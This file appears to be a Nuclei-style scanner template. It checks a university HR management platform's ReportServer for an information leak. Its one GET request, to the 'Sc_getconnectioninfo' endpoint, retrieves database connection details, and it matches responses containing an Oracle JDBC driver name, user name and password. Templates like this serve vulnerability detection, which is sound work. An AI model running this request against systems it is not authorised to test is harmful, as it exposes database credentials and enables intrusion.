id: poc-yaml-epxing-reportserver-info-leak
info:
  name: 高校人力资源管理服务平台 ReportServer 信息泄露漏洞
  author: ProjectDiscoveryAI
  severity: medium
  tags: 信息泄露
http:
  - method: GET
    path:
      - "{{BaseURL}}/ReportServer?op=Fr_server&cmd=Sc_getconnectioninfo"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "oracle.jdbc.driver.OracleDriver"
          - "\"password\":"
          - "\"user\":"
      - type: word
        words:
          - "<"
        negative: true
